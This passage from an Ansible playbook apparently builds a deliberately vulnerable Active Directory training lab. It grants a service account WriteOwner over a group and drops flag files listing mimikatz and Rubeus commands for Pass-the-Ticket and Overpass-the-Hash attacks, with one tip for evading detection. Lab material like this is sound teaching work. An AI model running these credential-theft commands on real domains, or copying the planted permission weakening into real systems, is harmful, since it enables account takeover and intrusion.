      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sid,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner,
        [System.Security.AccessControl.AccessControlType]::Allow
      )
      $obj = [ADSI]"LDAP://$($g.DistinguishedName)"
      $obj.ObjectSecurity.AddAccessRule($ace)
      $obj.CommitChanges()
      Write-Output "changed: svc_bobafett WriteOwner on finance_sync"
    } catch {
      Write-Output "WARN: $($_.Exception.Message)"
    }
  register: lat031_set
  changed_when: "'changed:' in lat031_set.stdout"
  failed_when: lat031_set.rc != 0

# LAT-034: Pass-the-ticket surface note
- name: LAT-034 - Drop Pass-the-Ticket surface note
  ansible.windows.win_copy:
    dest: 'C:\Flags\FLAG-LAT-034-PassTheTicket.txt'
    content: |
      LAT-034: Pass-the-Ticket (PtT) Surface
      ========================================
      Admin users on member servers have cached Kerberos TGTs in LSASS memory.
      LSASS is unprotected (RunAsPPL=0, WDigest=1 — set by vuln_cred_access).

      Extraction:
        mimikatz# sekurlsa::tickets /export
        Rubeus dump /service:krbtgt /nowrap

      Injection (lateral movement):
        mimikatz# kerberos::ptt <ticket.kirbi>
        Rubeus ptt /ticket:<base64>

      Targets with interesting tickets:
        - coruscant: krbtgt TGT (if admin session cached)
        - scarif: file share access TGTs (svc_bobafett, Administrator)
        - kamino: SQL service TGTs

# LAT-035: AES key extraction for Overpass-the-Hash
- name: LAT-035 - Drop Overpass-the-Hash surface note
  ansible.windows.win_copy:
    dest: 'C:\Flags\FLAG-LAT-035-OverpassTheHash.txt'
    content: |
      LAT-035: Overpass-the-Hash (AES Key Extraction)
      =================================================
      LSASS stores AES128/AES256 session keys for interactive logons.
      With LSASS unprotected (vuln_cred_access RunAsPPL=0):

      Extract AES keys:
        mimikatz# sekurlsa::ekeys

      Overpass-the-Hash (convert NT hash → TGT):
        Rubeus asktgt /user:Administrator /rc4:<NT_HASH> /domain:empire.local /ptt
        mimikatz# sekurlsa::pth /user:Administrator /domain:EMPIRE /ntlm:<hash>

      Use AES key (opsec: avoids RC4 downgrade detection):
        Rubeus asktgt /user:svc_bobafett /aes256:<AES_KEY> /domain:empire.local /ptt
